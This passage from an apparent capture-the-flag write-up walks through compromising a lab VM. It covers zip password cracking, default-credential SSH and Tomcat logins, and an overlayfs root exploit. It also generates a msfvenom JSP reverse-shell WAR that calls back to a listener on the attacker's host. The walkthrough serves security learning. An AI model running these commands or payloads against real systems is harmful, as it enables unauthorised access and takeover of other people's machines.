<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt# mkdir backup
</span><span class='line'>root@kali:/mnt# mount 192.168.217.128:/backup /mnt/backup
</span><span class='line'>ls -la
</span><span class='line'>total 12760
</span><span class='line'>drwxr-xr-x 2 root root     4096 Feb 14  2016 .
</span><span class='line'>drwxr-xr-x 4 root root     4096 Dec  2 17:45 ..
</span><span class='line'>-rw-r--r-- 1 root root 13058028 Feb 14  2016 backup.tar.bz2.zip</span></code></pre></td></tr></table></div></figure>


<p>When I tried unzipping it, I got prompted for a password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unzip backup.tar.bz2.zip 
</span><span class='line'>Archive:  backup.tar.bz2.zip
</span><span class='line'>[backup.tar.bz2.zip] backup.tar.bz2 password:</span></code></pre></td></tr></table></div></figure>


<p>There is an utility that will come just in handy for this, called <strong>fcrackzip</strong>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fcrackzip --help
</span><span class='line'>
</span><span class='line'>fcrackzip version 1.0, a fast/free zip password cracker
</span><span class='line'>written by Marc Lehmann &lt;pcg@goof.com&gt; You can find more info on
</span><span class='line'>http://www.goof.com/pcg/marc/
</span><span class='line'>
</span><span class='line'>USAGE: fcrackzip
</span><span class='line'>          [-b|--brute-force]            use brute force algorithm
</span><span class='line'>          [-D|--dictionary]             use a dictionary
</span><span class='line'>          [-B|--benchmark]              execute a small benchmark
</span><span class='line'>          [-c|--charset characterset]   use characters from charset
</span><span class='line'>          [-h|--help]                   show this message
</span><span class='line'>          [--version]                   show the version of this program
</span><span class='line'>          [-V|--validate]               sanity-check the algortihm
</span><span class='line'>          [-v|--verbose]                be more verbose
</span><span class='line'>          [-p|--init-password string]   use string as initial password/file
</span><span class='line'>          [-l|--length min-max]         check password with length min to max
</span><span class='line'>          [-u|--use-unzip]              use unzip to weed out wrong passwords
</span><span class='line'>          [-m|--method num]             use method number "num" (see below)
</span><span class='line'>          [-2|--modulo r/m]             only calculcate 1/m of the password
</span><span class='line'>          file...                    the zipfiles to crack
</span><span class='line'>
</span><span class='line'>methods compiled in (* = default):
</span><span class='line'>
</span><span class='line'> 0: cpmask
</span><span class='line'> 1: zip1
</span><span class='line'>*2: zip2, USE_MULT_TAB</span></code></pre></td></tr></table></div></figure>


<p>Since the passwords so far have been laughable, I used it in bruteforce mode, but still I was really surprised to get the password instantly:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fcrackzip -b -u -v backup.tar.bz2.zip 
</span><span class='line'>found file 'backup.tar.bz2', (size cp/uc 13057834/13076586, flags 9, chk 28e3)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>PASSWORD FOUND!!!!: pw == aaaaaa</span></code></pre></td></tr></table></div></figure>


<p>From the archive I extracted a html folder filled with what appear to be web applications:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls
</span><span class='line'>dvwa  gentleman  index.html  web-standards  zenphoto</span></code></pre></td></tr></table></div></figure>


<p>I found some passwords inside, but the content was massive. Maybe I will get back to it later, if needed.</p>

<h2>Samba</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
</span><span class='line'>Host script results:
</span><span class='line'>|_nbstat: NetBIOS name: CANYOUPWNME, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span><span class='line'>| smb-os-discovery: 
</span><span class='line'>|   OS: Unix (Samba 4.1.6-Ubuntu)
</span><span class='line'>|   Computer name: canyoupwnme
</span><span class='line'>|   NetBIOS computer name: CANYOUPWNME\x00
</span><span class='line'>|   Domain name: 
</span><span class='line'>|   FQDN: canyoupwnme
</span><span class='line'>|_  System time: 2017-12-02T21:15:36+02:00
</span><span class='line'>| smb-security-mode: 
</span><span class='line'>|   account_used: guest
</span><span class='line'>|   authentication_level: user
</span><span class='line'>|   challenge_response: supported
</span><span class='line'>|_  message_signing: disabled (dangerous, but default)
</span><span class='line'>| smb2-security-mode: 
</span><span class='line'>|   2.02: 
</span><span class='line'>|_    Message signing enabled but not required
</span><span class='line'>| smb2-time: 
</span><span class='line'>|   date: 2017-12-02 14:15:37
</span><span class='line'>|_  start_date: 1600-12-31 19:03:58</span></code></pre></td></tr></table></div></figure>


<p>Time to gather some more information with enum4linux. This gave a plethora of info, but to summarize, it found the users: root, admin, user.</p>

<h2>SSH &ndash; privilege escalation</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>1322/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 17:32:b4:85:06:20:b6:90:5b:75:1c:6e:fe:0f:f8:e2 (DSA)
</span><span class='line'>|   2048 53:49:03:32:86:0b:15:b8:a5:f1:2b:8e:75:1b:5a:06 (RSA)
</span><span class='line'>|   256 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a (ECDSA)
</span><span class='line'>|_  256 11:99:87:52:15:c8:ae:96:64:73:d6:49:8c:d7:d7:9f (EdDSA)</span></code></pre></td></tr></table></div></figure>


<p>Here I tried connecting with the credentials I knew, and got in with the admin/admin pair. I searched for a privilege escalation exploit then, and reading /etc/issue was helpful in that regard:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/issue
</span><span class='line'>Ubuntu 14.04.3 LTS \n \l</span></code></pre></td></tr></table></div></figure>


<p>Found the <a href="https://www.exploit-db.com/exploits/39166/">overlayfs applicable exploit</a>, downloaded, compiled and boom:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>admin@canyoupwnme:~$ ./overlayfs 
</span><span class='line'>root@canyoupwnme:~# id
</span><span class='line'>uid=0(root) gid=1002(admin) groups=0(root),1002(admin)
</span><span class='line'>root@canyoupwnme:~# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<h2>Redis</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>6379/tcp  open  redis       Redis key-value store 3.0.7</span></code></pre></td></tr></table></div></figure>


<p>Redis is something you don&rsquo;t get very often on boot2roots, so this was definitely interesting! First, what is <a href="https://redis.io/topics/introduction">Redis</a>?</p>

<blockquote><p>Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message
broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps,
hyperloglogs and geospatial indexes with radius queries. Redis has built-in replication, Lua scripting, LRU
eviction, transactions and different levels of on-disk persistence, and provides high availability via Redis
Sentinel and automatic partitioning with Redis Cluster</p></blockquote>

<p>The Redis instance can be accessed with the <em>redis-cli</em> tool. I had to install the <em>redis-tools</em> package to get it.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>redis-cli -h
</span><span class='line'>redis-cli 4.0.2
</span><span class='line'>
</span><span class='line'>Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]
</span><span class='line'>  -h &lt;hostname&gt;      Server hostname (default: 127.0.0.1).
</span><span class='line'>  -p &lt;port&gt;          Server port (default: 6379).
</span><span class='line'>  -s &lt;socket&gt;        Server socket (overrides hostname and port).
</span><span class='line'>  -a &lt;password&gt;      Password to use when connecting to the server.
</span><span class='line'>  -r &lt;repeat&gt;        Execute specified command N times.
</span><span class='line'>  -i &lt;interval&gt;      When -r is used, waits &lt;interval&gt; seconds per command.
</span><span class='line'>                     It is possible to specify sub-second times like -i 0.1.
</span><span class='line'>  -n &lt;db&gt;            Database number.
</span><span class='line'>  -x                 Read last argument from STDIN.
</span><span class='line'>  -d &lt;delimiter&gt;     Multi-bulk delimiter in for raw formatting (default: \n).
</span><span class='line'>  -c                 Enable cluster mode (follow -ASK and -MOVED redirections).
</span><span class='line'>  --raw              Use raw formatting for replies (default when STDOUT is
</span><span class='line'>                     not a tty).
</span><span class='line'>  --no-raw           Force formatted output even when STDOUT is not a tty.
</span><span class='line'>  --csv              Output in CSV format.
</span><span class='line'>  --stat             Print rolling stats about server: mem, clients, ...
</span><span class='line'>  --latency          Enter a special mode continuously sampling latency.
</span><span class='line'>                     If you use this mode in an interactive session it runs
</span><span class='line'>                     forever displaying real-time stats. Otherwise if --raw or
</span><span class='line'>                     --csv is specified, or if you redirect the output to a non
</span><span class='line'>                     TTY, it samples the latency for 1 second (you can use
</span><span class='line'>                     -i to change the interval), then produces a single output
</span><span class='line'>                     and exits.
</span><span class='line'>  --latency-history  Like --latency but tracking latency changes over time.
</span><span class='line'>                     Default time interval is 15 sec. Change it using -i.
</span><span class='line'>  --latency-dist     Shows latency as a spectrum, requires xterm 256 colors.
</span><span class='line'>                     Default time interval is 1 sec. Change it using -i.
</span><span class='line'>  --lru-test &lt;keys&gt;  Simulate a cache workload with an 80-20 distribution.
</span><span class='line'>  --slave            Simulate a slave showing commands received from the master.
</span><span class='line'>  --rdb &lt;filename&gt;   Transfer an RDB dump from remote server to local file.
</span><span class='line'>  --pipe             Transfer raw Redis protocol from stdin to server.
</span><span class='line'>  --pipe-timeout &lt;n&gt; In --pipe mode, abort with error if after sending all data.
</span><span class='line'>                     no reply is received within &lt;n&gt; seconds.
</span><span class='line'>                     Default timeout: 30. Use 0 to wait forever.
</span><span class='line'>  --bigkeys          Sample Redis keys looking for big keys.
</span><span class='line'>  --scan             List all keys using the SCAN command.
</span><span class='line'>  --pattern &lt;pat&gt;    Useful with --scan to specify a SCAN pattern.
</span><span class='line'>  --intrinsic-latency &lt;sec&gt; Run a test to measure intrinsic system latency.
</span><span class='line'>                     The test will run for the specified amount of seconds.
</span><span class='line'>  --eval &lt;file&gt;      Send an EVAL command using the Lua script at &lt;file&gt;.
</span><span class='line'>  --ldb              Used with --eval enable the Redis Lua debugger.
</span><span class='line'>  --ldb-sync-mode    Like --ldb but uses the synchronous Lua debugger, in
</span><span class='line'>                     this mode the server is blocked and script changes are
</span><span class='line'>                     are not rolled back from the server memory.
</span><span class='line'>  --help             Output this help and exit.
</span><span class='line'>  --version          Output version and exit.
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>  cat /etc/passwd | redis-cli -x set mypasswd
</span><span class='line'>  redis-cli get mypasswd
</span><span class='line'>  redis-cli -r 100 lpush mylist x
</span><span class='line'>  redis-cli -r 100 -i 1 info | grep used_memory_human:
</span><span class='line'>  redis-cli --eval myscript.lua key1 key2 , arg1 arg2 arg3
</span><span class='line'>  redis-cli --scan --pattern '*:12345*'
</span><span class='line'>
</span><span class='line'>  (Note: when using --eval the comma separates KEYS[] from ARGV[] items)
</span><span class='line'>
</span><span class='line'>When no command is given, redis-cli starts in interactive mode.
</span><span class='line'>Type "help" in interactive mode for information on available commands
</span><span class='line'>and settings.</span></code></pre></td></tr></table></div></figure>


<p>So I pointed the CLI tool to the Redis server and got a lot of information:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>redis-cli -h 192.168.217.128
</span><span class='line'>192.168.217.128:6379&gt; help
</span><span class='line'>redis-cli 4.0.2
</span><span class='line'>To get help about Redis commands type:
</span><span class='line'>      "help @&lt;group&gt;" to get a list of commands in &lt;group&gt;
</span><span class='line'>      "help &lt;command&gt;" for help on &lt;command&gt;
</span><span class='line'>      "help &lt;tab&gt;" to get a list of possible help topics
</span><span class='line'>      "quit" to exit
</span><span class='line'>
</span><span class='line'>To set redis-cli preferences:
</span><span class='line'>      ":set hints" enable online hints
</span><span class='line'>      ":set nohints" disable online hints
</span><span class='line'>Set your preferences in ~/.redisclirc
</span><span class='line'>192.168.217.128:6379&gt; info
</span><span class='line'># Server
</span><span class='line'>redis_version:3.0.7
</span><span class='line'>redis_git_sha1:00000000
</span><span class='line'>redis_git_dirty:0
</span><span class='line'>redis_build_id:aa70bcb321ba8313
</span><span class='line'>redis_mode:standalone
</span><span class='line'>os:Linux 3.19.0-25-generic i686
</span><span class='line'>arch_bits:32
</span><span class='line'>multiplexing_api:epoll
</span><span class='line'>gcc_version:4.8.4
</span><span class='line'>process_id:1263
</span><span class='line'>run_id:859e316c5f791eee47cb4e7aabdccfd2c3a124b9
</span><span class='line'>tcp_port:6379
</span><span class='line'>uptime_in_seconds:3235
</span><span class='line'>uptime_in_days:0
</span><span class='line'>hz:10
</span><span class='line'>lru_clock:2368010
</span><span class='line'>config_file:/etc/redis/6379.conf
</span><span class='line'>
</span><span class='line'># Clients
</span><span class='line'>connected_clients:1
</span><span class='line'>client_longest_output_list:0
</span><span class='line'>client_biggest_input_buf:0
</span><span class='line'>blocked_clients:0
</span><span class='line'>
</span><span class='line'># Memory
</span><span class='line'>used_memory:637624
</span><span class='line'>used_memory_human:622.68K
</span><span class='line'>used_memory_rss:8929280
</span><span class='line'>used_memory_peak:637624
</span><span class='line'>used_memory_peak_human:622.68K
</span><span class='line'>used_memory_lua:24576
</span><span class='line'>mem_fragmentation_ratio:14.00
</span><span class='line'>mem_allocator:jemalloc-3.6.0
</span><span class='line'>
</span><span class='line'># Persistence
</span><span class='line'>loading:0
</span><span class='line'>rdb_changes_since_last_save:0
</span><span class='line'>rdb_bgsave_in_progress:0
</span><span class='line'>rdb_last_save_time:1512314215
</span><span class='line'>rdb_last_bgsave_status:ok
</span><span class='line'>rdb_last_bgsave_time_sec:-1
</span><span class='line'>rdb_current_bgsave_time_sec:-1
</span><span class='line'>aof_enabled:0
</span><span class='line'>aof_rewrite_in_progress:0
</span><span class='line'>aof_rewrite_scheduled:0
</span><span class='line'>aof_last_rewrite_time_sec:-1
</span><span class='line'>aof_current_rewrite_time_sec:-1
</span><span class='line'>aof_last_bgrewrite_status:ok
</span><span class='line'>aof_last_write_status:ok
</span><span class='line'>
</span><span class='line'># Stats
</span><span class='line'>total_connections_received:2
</span><span class='line'>total_commands_processed:2
</span><span class='line'>instantaneous_ops_per_sec:0
</span><span class='line'>total_net_input_bytes:41
</span><span class='line'>total_net_output_bytes:6067614
</span><span class='line'>instantaneous_input_kbps:0.00
</span><span class='line'>instantaneous_output_kbps:0.00
</span><span class='line'>rejected_connections:0
</span><span class='line'>sync_full:0
</span><span class='line'>sync_partial_ok:0
</span><span class='line'>sync_partial_err:0
</span><span class='line'>expired_keys:0
</span><span class='line'>evicted_keys:0
</span><span class='line'>keyspace_hits:0
</span><span class='line'>keyspace_misses:0
</span><span class='line'>pubsub_channels:0
</span><span class='line'>pubsub_patterns:0
</span><span class='line'>latest_fork_usec:0
</span><span class='line'>migrate_cached_sockets:0
</span><span class='line'>
</span><span class='line'># Replication
</span><span class='line'>role:master
</span><span class='line'>connected_slaves:0
</span><span class='line'>master_repl_offset:0
</span><span class='line'>repl_backlog_active:0
</span><span class='line'>repl_backlog_size:1048576
</span><span class='line'>repl_backlog_first_byte_offset:0
</span><span class='line'>repl_backlog_histlen:0
</span><span class='line'>
</span><span class='line'># CPU
</span><span class='line'>used_cpu_sys:3.71
</span><span class='line'>used_cpu_user:1.60
</span><span class='line'>used_cpu_sys_children:0.00
</span><span class='line'>used_cpu_user_children:0.00
</span><span class='line'>
</span><span class='line'># Cluster
</span><span class='line'>cluster_enabled:0
</span><span class='line'>
</span><span class='line'># Keyspace
</span><span class='line'>192.168.217.128:6379&gt; </span></code></pre></td></tr></table></div></figure>


<p>It turns out, Redis is by default not that secure, and there are ways to achieve a somewhat arbitrary file upload on hosts running the Redis server. You can find a detailed explanation about it <a href="http://antirez.com/news/96">here</a>. I followed the steps outlined, and I also tried with the Metasploit Redis File Upload module, but it didn&rsquo;t work. Maybe some permissions issue, or Redis not running as root. The attempt was centered around copying an SSH key I generated to the remote authorized_keys file. But even though I didn&rsquo;t manage it, I learned something new about exploiting Redis today.</p>

<h2>Tomcat default credentials</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>| http-methods: 
</span><span class='line'>|_  Potentially risky methods: PUT DELETE
</span><span class='line'>|_http-open-proxy: Proxy might be redirecting requests
</span><span class='line'>|_http-server-header: Apache-Coyote/1.1
</span><span class='line'>|_http-title: Apache Tomcat</span></code></pre></td></tr></table></div></figure>


<p>Time to look at that Tomcat server!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nikto -h http://192.168.217.128:8080/
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.217.128
</span><span class='line'>+ Target Hostname:    192.168.217.128
</span><span class='line'>+ Target Port:        8080
</span><span class='line'>+ Start Time:         2017-12-03 12:21:45 (GMT-5)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache-Coyote/1.1
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1454530701000 
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
</span><span class='line'>+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
</span><span class='line'>+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
</span><span class='line'>+ /: Appears to be a default Apache Tomcat install.
</span><span class='line'>+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
</span><span class='line'>+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
</span><span class='line'>+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 'tomcat'). Apache Tomcat.
</span><span class='line'>+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
</span><span class='line'>+ /host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)
</span><span class='line'>+ /manager/status: Tomcat Server Status interface found (pass protected)
</span><span class='line'>+ 7661 requests: 0 error(s) and 14 item(s) reported on remote host
</span><span class='line'>+ End Time:           2017-12-03 12:22:12 (GMT-5) (27 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>Nikto found the default credentials of tomcat/tomcat. Used them to log in to the Web Application Manager interface.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/manager-fullpage.png" title="manager" alt="tomcat web application manager"></p>

<p>The interesting part here is that we can upload a WAR file. A Web Application Resource file is a JAR file used to distribute various components that make up a web application. For this particular scenario, I decided to generate a payload with msfvenom, but there is also a Metasploit module that can do the job: <code>msfvenom -a x86 &mdash;platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msfvenom -a x86 --platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war
</span><span class='line'>Payload size: 1099 bytes
</span><span class='line'>Final size of war file: 1099 bytes
</span><span class='line'>Saved as: runme.war</span></code></pre></td></tr></table></div></figure>


<p>Check what&rsquo;s inside:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>jar -tf runme.war 
</span><span class='line'>WEB-INF/
</span><span class='line'>WEB-INF/web.xml
</span><span class='line'>kndeoavjwgjs.jsp</span></code></pre></td></tr></table></div></figure>


<p>I deployed it and a new folder called /runme was created on the server. With a netcat listening, I browsed to the folder and bam!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 37009
</span><span class='line'>whoami
</span><span class='line'>tomcat7</span></code></pre></td></tr></table></div></figure>


<p>Since I already showed earlier the method of getting root, I will stop after getting the low privilege shells.</p>

<h2>Joomla</h2>

